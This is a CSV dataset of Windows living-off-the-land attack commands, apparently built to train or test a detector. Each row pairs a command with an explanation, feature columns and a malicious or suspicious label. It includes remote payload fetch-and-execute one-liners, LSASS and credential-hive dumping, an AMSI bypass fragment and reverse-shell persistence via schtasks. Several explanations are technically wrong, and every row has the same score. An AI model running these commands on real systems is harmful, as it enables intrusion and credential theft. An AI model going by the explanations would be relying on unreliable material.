prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",regsvr32,scrobj.dll,none,http://example.com/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious,,
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the compromised machine.",regsvr32,scrobj.dll,none,http://example.com/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious,,
runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test,"This command runs a script helper tool to check the surface of a file located at C:\Test\Microsoft\Diagnosis\scripts\test.txt and save the results in C:\Test, which could potentially be used to gather information about the file system and identify vulnerabilities.",runscripthelper.exe,C:\\Test,none,C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt,none,surfacecheck,none,0.65,malicious,,
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe","This command creates a scheduled task that runs a reverse shell executable every minute, allowing an attacker to maintain persistent access to the compromised machine.",schtasks,c:\\some\\directory\\revshell.exe,none,c:\\some\\directory\\revshell.exe,none,"/create,/sc,/mo,/tn,/tr",none,0.65,malicious,,
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to execute arbitrary code on the compromised machine.",SyncAppvPublishingServer.exe,New-Object Net.WebClient,none,http://some.url/script.ps1,none,"DownloadString, IEX",none,0.65,malicious,,
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""","This command injects a DLL into a running process and launches the Windows calculator, potentially allowing an attacker to execute arbitrary code on the compromised machine.",TTDInject.exe,C:/Windows/System32/calc.exe,none,7 tmp.run 0 0 0 0 0 0 0 0 0 0,none,"/ClientParams,/Launch",none,0.65,malicious,,
vbc.exe /target:exe c:\\temp\\vbs\\run.vb,"This command can be used to compile a VBScript file into an executable file, which can then be used to execute malicious code on a Windows machine.",vbc.exe,c:\\temp\\vbs\\run.vb,none,c:\\temp\\vbs\\run.vb,none,/target:exe,none,0.65,malicious,,
"wmic.exe process call create ""c:\\ads\\file.txt:program.exe""","This command can be used to execute a program hidden within an Alternate Data Stream (ADS) of a file, allowing an attacker to bypass detection and execute malicious code on a Windows machine.",wmic.exe,c:\\ads\\file.txt:program.exe,none,c:\\ads\\file.txt:program.exe,none,create,none,0.65,malicious,,
wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer,This command can be used to execute a malicious DLL file and potentially download and install additional malware onto the compromised machine.,wuauclt.exe,<Full_Path_To_DLL>,none,<Full_Path_To_DLL>,none,"/UpdateDeploymentProvider,/RunHandlerComServer",none,0.65,malicious,,
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,This command can be used to execute a malicious script hosted on a remote server and potentially download and execute additional malware on the Windows machine.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://pastebin.com/raw/iLxUT5gM,none,RunWizard,none,0.65,malicious,,
adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet,"This command can be used to capture a memory dump of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and save it to a specified output folder for later analysis.",adplus.exe,c:\\users\\mr.d0x\\output\\folder,none,lsass.exe,none,"-hang,-pn,-o,-quiet",none,0.65,malicious,,
"AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1","This command can be used to execute a PowerShell script (malicious.ps1) with arguments and log the output to specified files, potentially allowing an attacker to execute arbitrary code and maintain persistence on a Windows machine.",AgentExecutor.exe,"c:\\temp\\test.log,c:\\temp\\test1.log,c:\\temp\\test2.log",none,c:\\temp\\malicious.ps1,none,"powershell,60000",none,0.65,malicious,,
AppVLP.exe \\\\10.10.10.10\\calc.bat,"This command can be used to execute a batch file containing malicious code on a remote machine, potentially allowing an attacker to gain access or control over the machine.",AppVLP.exe,\\\\10.10.10.10\\calc.bat,none,\\\\10.10.10.10\\calc.bat,10.10.10.10,none,none,0.65,malicious,,
coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name,This command can be used to execute a malicious DLL file (evil.dll) under the guise of a legitimate process (dummy_assembly_name) in order to evade detection and perform malicious actions on the compromised Windows machine.,coregon.exe,C:\\folder\\evil.dll dummy_assembly_name,none,C:\\folder\\evil.dll dummy_assembly_name,none,/L,none,0.65,malicious,,
coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name,"This command can be used to generate a malicious DLL file and load it into memory, potentially allowing an attacker to execute arbitrary code on the compromised system.",coregen.exe,C:\\folder\\evil.dll dummy_assembly_name,none,C:\\folder\\evil.dll dummy_assembly_name,none,/L,none,0.65,malicious,,
Dxcap.exe -c C:\\Windows\\System32\\notepad.exe,"This command captures network traffic and saves it to a file, while also launching Notepad. 

Potential use in a cyberattack: Capture sensitive information being transmitted over the network while also distracting the user with a harmless Notepad window.",Dxcap.exe,C:\\Windows\\System32\\notepad.exe,none,C:\\Windows\\System32\\notepad.exe,none,-c,none,0.65,malicious,,
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,"Potential use: Download and execute a malicious DLL from a remote server using a trusted application.

What it does: Executes Microsoft Excel and loads a Teams add-in DLL from a remote server, which could potentially contain malicious code.",Excel.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious,,
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q","This command can be used to create a full copy of the Active Directory database on a Windows machine, which can be used for offline analysis or to extract sensitive information such as user credentials.",ntdsutil.exe,c:\\,none,c:\\,none,"ac,ifm,create,q",none,0.65,malicious,,
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",Powerpnt.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious,,
"Powerpnt.exe ""http://193.168.1.10/TeamsAddinLoader.dll""","Potential use: Download and execute a malicious DLL from a remote server disguised as a legitimate Teams add-in loader.

What it does: Executes PowerPoint and attempts to download and load the DLL from the specified URL, potentially giving the attacker remote access to the compromised machine.",Powerpnt.exe,http://193.168.1.10/TeamsAddinLoader.dll,none,http://193.168.1.10/TeamsAddinLoader.dll,193.168.1.10,none,none,0.65,malicious,,
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine.",Tracker.exe,C:\\Windows\\write.exe,none,\\calc.dll,none,"/d,/c",none,0.65,malicious,,
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine.",Tracker.exe,C:\\Windows\\write.exe,none,\\calc.dll,none,"/d,/c",none,0.65,malicious,,
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",This command could potentially be used to download and execute a malicious DLL file from a remote server using Microsoft Word as a living off the land technique on a Windows machine.,winword.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious,,
wsl.exe -e /mnt/c/Windows/System32/calc.exe,"This command can be used to execute the Windows Calculator application from within the Windows Subsystem for Linux (WSL) environment, potentially allowing an attacker to bypass security measures and run malicious code on a compromised machine.",wsl.exe,/mnt/c/Windows/System32/calc.exe,none,/mnt/c/Windows/System32/calc.exe,none,-e,none,0.65,malicious,,
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1,This command runs a PowerShell script that verifies the version of the AERO mutex and then runs another PowerShell script named calc.ps1 after canceling any previous instances of it. It could potentially be used in a living off the land attack to execute malicious PowerShell scripts and evade detection.,CL_Mutexverifiers.ps1,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1,none,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1,none,runAfterCancelProcess,none,0.65,malicious,,
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args],"This command can be used to execute an arbitrary executable with arguments, potentially allowing an attacker to run malicious code on the system.",CL_Invocation.ps1,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1,none,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1,none,SyncInvoke,none,0.65,malicious,,
set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf,"This command sets the command prompt to open the calculator and then runs a Windows script to manage BitLocker Drive Encryption, potentially allowing an attacker to bypass encryption and access sensitive data.",none,c:\\windows\\system32\\manage-bde.wsf,none,c:\\windows\\system32\\calc.exe,none,"comspec,cscript",none,0.65,malicious,,
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://domain.com/folder/file.sct,none,https://domain.com/folder/file.sct,127.0.0.1,none,none,0.65,malicious,,
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://10.10.10.10/folder/file.sct,none,https://10.10.10.10/folder/file.sct,127.0.0.1,none,none,0.65,malicious,,
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://11.10.10.10/folder/file.sct,none,https://11.10.10.10/folder/file.sct,127.0.0.1,none,none,0.65,malicious,,
reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs,"This command imports a registry file and then runs a VBScript to manage Windows activation, potentially allowing an attacker to activate a stolen or pirated copy of Windows on a compromised machine.",reg.exe,c:\\windows\\system32\\slmgr.vbs,none,c:\\path\\to\\Slmgr.reg,none,"import,cscript,/b",none,0.65,malicious,,
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the compromised machine.",SyncAppvPublishingServer.vbs,New-Object Net.WebClient,none,http://some.url/script.ps1\,none,"DownloadString, IEX",none,0.65,malicious,,
%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,"This command can be used to bypass Windows Defender and execute malicious code through Windows Remote Management (WinRM) by retrieving the process handle of a legitimate process (in this case, Handle 4) and injecting malicious code into it.",winrm.vbs, %windir%\\System32\\winrm.vbs,none,%SystemDrive%\\BypassDir\\cscript,none,get,none,0.65,malicious,,
sc \\10.10.10.10 start ExampleService,"This command can be used to start a service named ExampleService on a remote machine with IP address 10.10.10.10, which can be useful for executing malicious code or maintaining persistence on a compromised machine.",sc,ExampleService,none,none,10.10.10.10,start,none,0.65,malicious,,
sc \\host.domain start ExampleService,"Potential use in a cyberattack: Starting a service on a remote machine to establish persistence or execute malicious code.
What it might do on a Windows machine: Starts the ExampleService on the remote machine specified by the host.domain parameter.",sc,ExampleService,none,none,host.domain,start,none,0.65,malicious,,
MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file as a build script, which can be abused to execute arbitrary code or commands on a target machine.",MSBuild.exe,\\10.10.10.10\path\to\XMLfile.xml,none,\\10.10.10.10\path\to\XMLfile.xml,10.10.10.10,none,none,0.65,suspicious,,
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file remotely, potentially allowing an attacker to execute malicious code on the target machine.",MSBuild.exe,\\10.10.10.10\path\to\XMLfile.xml,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,10.10.10.10,none,none,0.65,suspicious,,
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,\\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml,none,LABWIN10.lab.local,none,create,none,0.65,suspicious,,
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,C:\Windows\Temp\build.xml,none,LABWIN10.lab.local,none,create,none,0.65,suspicious,,
mshta.exe http://11.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to download and execute additional malware on the victim's machine.",mshta.exe,http://11.10.10.10/runme.hta,none,http://11.10.10.10/runme.hta,11.10.10.10,none,none,0.65,malicious,,
mshta.exe http://10.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, allowing an attacker to run arbitrary code on the victim's machine.",mshta.exe,http://10.10.10.10/runme.hta,none,http://10.10.10.10/runme.hta,10.10.10.10,none,none,0.65,malicious,,
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and load it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the system.",regsvr32,scrobj.dll,none,http://server/file.sct,none,"/s,/n,/u,/i",none,0.65,malicious,,
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"This command can be used to check if the Anti-Malware Scan Interface (AMSI) is disabled on a Windows machine, which can be useful for bypassing antivirus detection during a cyberattack.",powershell,amsiInitFailed,none,System.Management.Automation.AmsiUtils,none,"GetType,GetField",none,0.65,malicious,,
powershell Get-DomainComputer -identity LAPS-COMPUTER -properties ms-Mcs-AdmPwd,"This command can be used to retrieve the Local Administrator Password Solution (LAPS) password for a specific computer in a domain, which can be useful for privilege escalation or lateral movement in a cyberattack on a Windows machine.",powershell,ms-Mcs-AdmPwd,none,LAPS-COMPUTER,none,Get-DomainComputer,none,0.65,malicious,,
"powershell Get-DomainSPNTicket -SPN ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for a specified service principal name (SPN) and can be used in a Pass-the-Ticket attack to gain access to other resources on the network.,powershell,MSSQLSvc/sqlserver.targetdomain.com,none,none,targetdomain.com,"Get-DomainSPNTicket,-SPN",none,0.65,malicious,,
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe,"This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for the Administrator account using a precomputed NTLM hash, and then launch a new command prompt with the TGT in a network-only context, allowing an attacker to execute commands with elevated privileges without leaving traces on the local machine.",cmd.exe,/rc4:[NTLMHASH],none,C:\Windows\System32\cmd.exe,none,"Rubeus.exe,asktgt,/createnetonly",none,0.65,malicious,,
"schtasks /RUN /TN ""shell"" /s dc.targetdomain.com","This command can be used to execute a scheduled task named ""shell"" on a remote machine ""dc.targetdomain.com"" and can be used to run malicious code or commands on the target machine.",schtasks,shell,none,none,dc.targetdomain.com,"/RUN,/TN,/s",none,0.65,malicious,,
"schtasks /RUN /TN ""shell"" /s 10.10.10.10","This command can be used to execute a scheduled task named ""shell"" on a remote machine with IP address 10.10.10.10, potentially allowing an attacker to run malicious code or commands on the target machine.",schtasks,shell,none,none,10.10.10.10,"/RUN,/TN,/s",none,0.65,malicious,,
powershell $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN/targetuser',"This command can be used to create a new PowerShell credential object for a specified domain user, which can then be used to execute commands or scripts with the privileges of that user.",powershell,System.Management.Automation.PSCredential,none,DOMAIN/targetuser,none,New-Object,none,0.65,malicious,,
"powershell Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination ""C:\Users\public\""","This command can be used to copy the Invoke-Mimikatz PowerShell script to a remote session and save it to the public folder on the target machine, allowing an attacker to execute the script and potentially extract credentials from memory.",poweshell,C:\Users\public\,none,.\Invoke-Mimikatz.ps1,none,Copy-Item,none,0.65,malicious,,
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.,MS-RPRN.exe,unconstrained-server.targetdomain.com,none,dc.targetdomain.com,unconstrained-server.targetdomain.com,none,none,0.65,malicious,,
.\MS-RPRN.exe \\dc.targetdomain.com \\10.10.10.10,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.,MS-RPRN.exe,10.10.10.10,none,dc.targetdomain.com,10.10.10.10,none,none,0.65,malicious,,
"powershell Add-ObjectACL -TargetDistinguishedName ""dc=targetdomain","This command can be used to add an Access Control List (ACL) to a target object in Active Directory, potentially allowing an attacker to gain unauthorized access to sensitive information or systems within the target domain.",powershell,TargetDistinguishedName,none,none,targetdomain,Add-ObjectACL,none,0.65,malicious,,
"powershell Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name ""RunAsPPL""","This command can be used to check if the ""RunAsPPL"" registry value is enabled, which can be leveraged in a cyberattack to bypass User Account Control (UAC) and gain elevated privileges on a Windows machine.",powershell,HKLM:\SYSTEM\CurrentControlSet\Control\Lsa,none,HKLM:\SYSTEM\CurrentControlSet\Control\Lsa,none,Get-ItemProperty ,none,0.65,malicious,,
.\procdump.exe -r -ma lsass.exe lsass.dmp,"This command can be used to dump the memory of the LSASS process, which contains sensitive information such as passwords and credentials, and can be used for further analysis or exploitation.",procdump.exe,lsass.dmp,none,lsass.exe,none,"-r,-ma",none,0.65,malicious,,
.\procdump.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdump.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious,,
.\procdumpx86.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdumpx86.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious,,
.\procdumpx64.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdumpx64.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious,,
reg.exe save hklm\security c:\users\public\downloads\security.save,"This command can be used to save the security hive of the Windows Registry to a file, which can then be exfiltrated by an attacker for further analysis or exploitation.",reg.exe,c:\users\public\downloads\security.save,none,hklm\security,none,save,none,0.65,malicious,,
wmic shadowcopy call create Volume='C:\',"This command can be used to create a shadow copy of the C:\ volume, which can be used to backup or restore files, but can also be used by an attacker to access and copy sensitive data without being detected.",wmic,C:\,none,shadowcopy,none,create,none,0.65,malicious,,
powershell Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess,"This command can be used to remotely execute a PowerShell script on a target machine using a specified credential and session, which can be useful for lateral movement and executing malicious code on a compromised machine.",powershell,c:\FilePath\file.ps1,none,$cred,none,"-Credential,-Session",none,0.65,malicious,,
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll,"This command can be used to load a malicious DLL as a plugin on a DNS server, allowing an attacker to intercept and manipulate DNS traffic.",dnscmd,\\Path\To\Our\Dll\malicious.dll,none,\\Path\To\Our\Dll\malicious.dll,none,"/config,/serverlevelplugindll",none,0.65,malicious,,
powershell Invoke-WebRequest -OutFile index.html -Uri https://superuser.com,"This command can be used to download a webpage and save it as a file on the local machine, potentially allowing an attacker to gather information about the target's browsing habits or steal sensitive information entered on the webpage.",powershell,index.html,none,https://superuser.com,none,"Invoke-WebRequest,-OutFile",none,0.65,malicious,,
bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine.",bitsadmin,c:\10mb.zip,none,http://downloadsrv/10mb.zip,none,"/transfer,/download,/priority",none,0.65,malicious,,
"certutil.exe -urlcache -split -f ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command downloads and caches the PSTools.zip file from a remote server, which could be used to execute remote commands and potentially escalate privileges on a compromised machine.",certutil.exe,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"-urlcache,-split,-f",none,0.65,malicious,,
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex""","This command can be used to download and execute a PowerShell script from a remote server using the default network credentials, allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://webserver/payload.ps1,none,"-exec,bypass,-c",none,0.65,malicious,,
cmd.exe /k < \\webdavserver\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote WebDAV server, potentially allowing an attacker to execute malicious code on a compromised machine.",cmd.exe,\\webdavserver\folder\batchfile.txt,none,\\webdavserver\folder\batchfile.txt,none,/k,none,0.65,malicious,,
cscript //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a JScript payload stored in a remote WebDAV server, allowing an attacker to remotely execute code on a Windows machine.",cscript,\\webdavserver\folder\payload.txt,none,\\webdavserver\folder\payload.txt,none,//E:jscript,none,0.65,malicious,,
"mshta vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote web server and can be used for downloading and executing malicious code on a Windows machine.,mshta ,http://webserver/payload.sct,none,http://webserver/payload.sct,none,"Execute,GetObject",none,0.65,malicious,,
mshta http://11.11.11.11/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://11.11.11.11/payload.hta,none,http://11.11.11.11/payload.hta,11.11.11.11,none,none,0.65,malicious,,
mshta http://10.10.10.10/payload.hta,This command can be used to execute a malicious payload hosted on a remote server via HTA (HTML Application) on a Windows machine.,mshta ,http://10.10.10.10/payload.hta,none,http://10.10.10.10/payload.hta,10.10.10.10,none,none,0.65,malicious,,
cscript.exe //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote WebDAV server using JScript, allowing an attacker to remotely execute code on a Windows machine.",cscript.exe,\\webdavserver\folder\payload.txt,none,\\webdavserver\folder\payload.txt,none,//E:jscript,none,0.65,malicious,,
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote server and can be used to download and execute malicious code on a Windows machine.,mshta.exe,http://webserver/payload.sct,none,http://webserver/payload.sct,none,"Execute,GetObject",none,0.65,malicious,,
mshta.exe http://11.11.11.11/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to the victim's machine.",mshta.exe,http://11.11.11.11/payload.hta,none,http://11.11.11.11/payload.hta,11.11.11.11,none,none,0.65,malicious,,
mshta.exe http://10.10.10.10/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to a Windows machine.",mshta.exe,http://10.10.10.10/payload.hta,none,http://10.10.10.10/payload.hta,10.10.10.10,none,none,0.65,malicious,,
rundll32 \\19.19.19.19\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote location on a Windows machine.,rundll32 ,\\19.19.19.19\folder\payload.dll,none,\\19.19.19.19\folder\payload.dll,19.19.19.19,none,none,0.65,malicious,,
rundll32 \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine.",rundll32 ,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,none,none,0.65,malicious,,
rundll32.exe \\19.19.19.19\folder\payload.dll,"This command can be used to execute a payload DLL file located on a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the target machine.",rundll32.exe,\\19.19.19.19\folder\payload.dll,none,\\19.19.19.19\folder\payload.dll,19.19.19.19,none,none,0.65,malicious,,
rundll32.exe \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine.",rundll32.exe,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,none,none,0.65,malicious,,
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious,,
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious,,
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious,,
"wmic os get /format:""https://webserver/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.,wmic,https://webserver/payload.xsl,none,https://webserver/payload.xsl,none,"get,/format",none,0.65,malicious,,
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll,This command can be used to unregister a malicious .dll payload hosted on a remote webdav server from a Windows machine.,regasm.exe,\\webdavserver\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,none,/u,none,0.65,malicious,,
regasm /u \\webdavserver\folder\payload.dll,"This command can be used to unregister a malicious .dll payload hosted on a remote WebDAV server, potentially used in a living off the land attack, from a Windows machine.",regasm,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,/u,none,0.65,malicious,,
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll,This command can be used to execute a malicious payload hosted on a web server by unregistering a legitimate DLL file and replacing it with the malicious payload.,regsvr32,scrobj.dll,none,http://webserver/payload.sct,none,"/u,/n,/s,/i",none,0.65,malicious,,
